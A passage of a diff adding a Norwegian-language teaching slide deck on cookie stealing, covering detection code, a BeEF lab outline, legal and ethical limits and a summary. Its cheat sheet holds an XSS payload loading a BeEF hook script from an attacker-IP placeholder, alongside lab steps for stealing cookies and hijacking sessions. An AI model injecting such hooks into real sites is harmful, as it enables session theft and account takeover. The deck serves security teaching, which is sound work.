+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.warn(<span class="string">'Cookie modified!'</span>, val);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">return</span> originalCookie.set.call(document, val);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                &nbsp;&nbsp;});<br>
+                })();
+            </div>
+            
+            <h3>2. Server-Side Anomaly Detection</h3>
+            <ul>
+                <li>Plutselig endring i IP-adresse</li>
+                <li>Uvanlig geografisk lokasjon</li>
+                <li>Endring i User-Agent</li>
+                <li>Flere samtidige sesjoner</li>
+                <li>Unormal aktivitetsmønster</li>
+            </ul>
+            
+            <h3>3. Security Headers Monitoring</h3>
+            <div class="code-example">
+                <span class="comment">// Log mistenkelige requests</span><br>
+                <span class="keyword">if</span> (!req.headers.referer || <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;!req.headers.referer.includes(ALLOWED_DOMAIN)) {<br>
+                &nbsp;&nbsp;logSuspiciousActivity({<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;ip: req.ip,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;cookies: req.cookies,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;timestamp: Date.now()<br>
+                &nbsp;&nbsp;});<br>
+                }
+            </div>
+            
+            <div class="info-box">
+                <strong>🚨 Alert Triggers:</strong>
+                <ul>
+                    <li>Multiple failed auth attempts</li>
+                    <li>Requests til kjente cookie logger URLs</li>
+                    <li>Rapid session ID changes</li>
+                    <li>XSS payload patterns i input</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 13: Lab Forberedelse - Cookie Stealing -->
+        <div class="slide">
+            <h1>Lab Forberedelse - Cookie Stealing med BeEF</h1>
+            
+            <h2>🧪 Lab Øvelse Oversikt</h2>
+            
+            <div class="success-box">
+                <h3>Del 1: Miljø Setup</h3>
+                <ul>
+                    <li>Start Kali Linux og BeEF Framework</li>
+                    <li>Konfigurer target applikasjon (DVWA/WebGoat)</li>
+                    <li>Sett opp cookie logger server</li>
+                    <li>Åpne BeEF control panel</li>
+                </ul>
+            </div>
+            
+            <div class="success-box">
+                <h3>Del 2: Cookie Reconnaissance</h3>
+                <ul>
+                    <li>Identifiser alle cookies i target app</li>
+                    <li>Kategoriser cookies (session, auth, tracking)</li>
+                    <li>Sjekk cookie flags (HttpOnly, Secure, SameSite)</li>
+                    <li>Dokumenter sårbarheter</li>
+                </ul>
+            </div>
+            
+            <div class="success-box">
+                <h3>Del 3: Exploitation</h3>
+                <ul>
+                    <li>Injiser BeEF hook via XSS</li>
+                    <li>Kjør "Get Cookie" modul</li>
+                    <li>Eksporter stjålne cookies</li>
+                    <li>Demonstrer session hijacking</li>
+                    <li>Test cookie replay attack</li>
+                </ul>
+            </div>
+            
+            <div class="success-box">
+                <h3>Del 4: Avanserte Teknikker</h3>
+                <ul>
+                    <li>Bypass HttpOnly med alternative metoder</li>
+                    <li>Persistent cookie stealing med BeEF</li>
+                    <li>Automatiser cookie harvesting</li>
+                    <li>Test cross-domain cookie access</li>
+                </ul>
+            </div>
+            
+            <h3>Lab Commands Cheat Sheet</h3>
+            <div class="code-example">
+                <span class="comment"># Start BeEF</span><br>
+                cd /usr/share/beef-xss<br>
+                ./beef<br><br>
+                
+                <span class="comment"># Access BeEF Panel</span><br>
+                http://127.0.0.1:3000/ui/panel<br>
+                Username: beef / Password: beef<br><br>
+                
+                <span class="comment"># Test payload</span><br>
+                &lt;script src="http://[ATTACKER-IP]:3000/hook.js"&gt;&lt;/script&gt;
+            </div>
+        </div>
+
+        <!-- Slide 14: Etiske og Juridiske Aspekter -->
+        <div class="slide">
+            <h1>Etiske og Juridiske Hensyn</h1>
+            
+            <h2>⚖️ Juridiske Konsekvenser</h2>
+            
+            <div class="danger-box">
+                <h3>Cookie Stealing er ULOVLIG når:</h3>
+                <ul>
+                    <li>Utført uten eksplisitt tillatelse</li>
+                    <li>På systemer du ikke eier</li>
+                    <li>For å få uautorisert tilgang</li>
+                    <li>For økonomisk vinning</li>
+                </ul>
+                <p><strong>Straff:</strong> Opptil 6 års fengsel i Norge (Straffeloven §201-205)</p>
+            </div>
+            
+            <h2>✅ Lovlig Testing</h2>
+            <div class="success-box">
+                <h3>Krav for lovlig penetrasjonstesting:</h3>
+                <ul>
+                    <li>Skriftlig avtale/kontrakt</li>
+                    <li>Definert scope og tidsramme</li>
+                    <li>Rules of Engagement (RoE)</li>
+                    <li>NDA og konfidensialitet</li>
+                    <li>Forsikring og ansvarsbegrensning</li>
+                </ul>
+            </div>
+            
+            <h2>🎯 Responsible Disclosure</h2>
+            <ol>
+                <li><strong>Oppdager sårbarhet</strong> - Dokumenter nøye</li>
+                <li><strong>Kontakt eier</strong> - Privat, ikke offentlig</li>
+                <li><strong>Gi tid</strong> - Vanligvis 90 dager for fix</li>
+                <li><strong>Koordiner</strong> - Samarbeid om løsning</li>
+                <li><strong>Publiser ansvarlig</strong> - Etter fix er implementert</li>
+            </ol>
+            
+            <div class="warning-box">
+                <strong>Bug Bounty:</strong> Mange selskaper har programmer som belønner etisk hacking. Sjekk alltid scope og regler først!
+            </div>
+        </div>
+
+        <!-- Slide 15: Oppsummering -->
+        <div class="slide">
+            <h1>Oppsummering - Cookies & Cookie Stealing</h1>
+            
+            <h2>🎯 Hovedlæringspunkter</h2>
+            
+            <div class="cookie-card">
+                <h3>🍪 Cookies er kritiske</h3>
+                <p>Session management, autentisering og tracking - cookies er overalt og må beskyttes</p>
+            </div>
+            
+            <div class="cookie-card">
+                <h3>🎣 Multiple angrepsmetoder</h3>
+                <p>XSS, MitM, Session Fixation, CSRF - mange veier til cookie-kompromittering</p>
+            </div>
+            
+            <div class="cookie-card">
+                <h3>🥩 BeEF demonstrerer impact</h3>
+                <p>Viser reell konsekvens av XSS og cookie stealing i praksis</p>
+            </div>
+            
+            <div class="cookie-card">
+                <h3>🛡️ Forsvar krever flere lag</h3>
+                <p>HttpOnly + Secure + SameSite + CSP + Monitoring = Defense in Depth</p>
+            </div>
+            
+            <h2>🚀 Neste Steg: Hands-On Lab</h2>
+            
+            <div class="beef-attack">
+                <h3>Lab Mål:</h3>
+                <ul>
+                    <li>✅ Identifisere sårbare cookies</li>
+                    <li>✅ Utnytte XSS for cookie stealing</li>
+                    <li>✅ Bruke BeEF for automatisert theft</li>
+                    <li>✅ Demonstrere session hijacking</li>
+                    <li>✅ Implementere beskyttelse</li>
+                </ul>
+            </div>
+            
+            <div class="success-box">
+                <h3 style="text-align: center;">Ready for Action!</h3>
+                <p style="text-align: center;">Husk: Kun i lab-miljø, aldri på ekte systemer!</p>
+            </div>
+            
+            <h2 style="text-align: center; color: #f5576c; margin-top: 30px;">
+                Lykke til med Cookie Stealing Lab! 🍪🔓
+            </h2>
+        </div>
+
+        <!-- Navigation -->
+        <div class="navigation">
+            <button class="nav-button" id="prevBtn" onclick="changeSlide(-1)">⬅ Forrige</button>
+            <span class="slide-counter" id="slideCounter">1 / 15</span>
+            <button class="nav-button" id="nextBtn" onclick="changeSlide(1)">Neste ➡</button>
+        </div>
+    </div>
+
+    <script>
+        let currentSlide = 1;
+        const totalSlides = 15;
+
+        function showSlide(n) {
+            const slides = document.getElementsByClassName('slide');
+            
+            // Adjust currentSlide if out of bounds
+            if (n > totalSlides) {
+                currentSlide = totalSlides;
+            } else if (n < 1) {
+                currentSlide = 1;
+            } else {
+                currentSlide = n;
+            }
+            
+            // Hide all slides
+            for (let i = 0; i < slides.length; i++) {
+                slides[i].classList.remove('active');
+                slides[i].style.display = 'none';
+            }
+            
+            // Show current slide
+            if (slides[currentSlide - 1]) {
+                slides[currentSlide - 1].classList.add('active');
+                slides[currentSlide - 1].style.display = 'block';
+            }
+            
+            // Update counter
+            document.getElementById('slideCounter').textContent = currentSlide + ' / ' + totalSlides;
+            
+            // Update button states
+            document.getElementById('prevBtn').disabled = currentSlide === 1;
+            document.getElementById('nextBtn').disabled = currentSlide === totalSlides;
+        }
+
+        function changeSlide(n) {
+            showSlide(currentSlide + n);
+        }
+
+        // Keyboard navigation
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowLeft' && currentSlide > 1) {
+                changeSlide(-1);
+            } else if (e.key === 'ArrowRight' && currentSlide < totalSlides) {
+                changeSlide(1);
+            }
+        });
+
+        // Initialize when page loads
+        window.addEventListener('DOMContentLoaded', function() {
+            showSlide(1);
+        });
+    </script>
+</body>
+</html>
